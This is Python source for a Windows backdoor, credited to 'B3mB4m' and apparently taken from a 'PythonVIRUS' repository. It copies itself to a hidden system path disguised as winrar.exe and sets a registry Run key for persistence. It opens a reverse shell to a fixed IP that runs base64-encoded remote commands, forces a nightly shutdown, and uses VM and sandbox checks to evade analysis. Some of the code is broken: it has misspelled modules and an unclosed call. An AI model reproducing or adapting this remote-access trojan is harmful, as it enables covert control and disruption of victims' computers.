[~] Concat : b3mb4m@protonmail.com
[~] Greetz : Bomberman,T-rex,Pixi


#https://github.com/b3mb4m/PythonVIRUS/blob/master/FinishedScripts/antidebug.py
from protect import antidebug
from VMsensor import TestVM
from antisandbox import antisandbox

"""
Coded by B3mB4m
b3mb4m@tuta.io
"""

import os
import ftplib 
import shutil
import _winreg
import win32api
import win32con
import threading
import subprocess
import socket
import datatime
import time
import sys
import base64




class BackDoor(object):
	def __init__(self):
		self.HOST = "192.168.2.1" #Statıc IP
		self.PORT = "80" #PORT 
		self.bcpath = r"C:\WINDOWS\security\b3m.exe" #Invısıble program name(Backconnect) 
 	def regedit(self):
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, _winreg.KEY_ALL_ACCESS)#Add startup test success !
		_winreg.SetValueEx(key, "NAME", 0, _winreg.REG_SZ, "PATH")
		key.Close()
		#Find good "NAME" and good "PATH" here (Not arouse suspicion ) ..
	def invisible(self, backpath):
		return win32api.SetFileAttributes(backpath,win32con.FILE_ATTRIBUTE_HIDDEN)	
		#Test success !
	def bc(self):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((self.HOST, self.PORT))#Backconnect (TCP) configuration
		self.s.send('Connection complate ! \n')
		try:
			while True:
				self.s.send('>>>  ')
				data = base64.b64decode(self.s.recv(1024))
				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
				stdout_value = proc.stdout.read() + proc.stderr.read()
				self.s.send(base64.b64encode(stdout_value))
        	self.s.close()
		except:
			while True:
				try:
					BackDoor().bc()
				except:
					continue	
	def forceclose(self):
		while True:
			if datatime.datatime.now().hour == 2: #You can change the time if u want
				return subprocess.call(["shutdown", "-f", "-s", "-t", "2"])

	def run(self):
		self.copyhimself = shutil.copy("winrar.exe", self.bcpath) #(1) Copy himself
		BackDoor().regedit() #(2) Call the regedit module
		BackDoor().invisible(self.bcpath)#(3) Make ınvısıble
		threading.Thread(target=self.bc).start()#(4) Start bc  -------\\\ That functions 
		threading.Thread(target=self.forceclose).start() #Force close--//	will be working some time ..
	
   
if TestVM().checkVirtualMachine() != True and antisandbox() != True:
	BackDoor().run() 
else:
	os.remove(sys.argv[0]
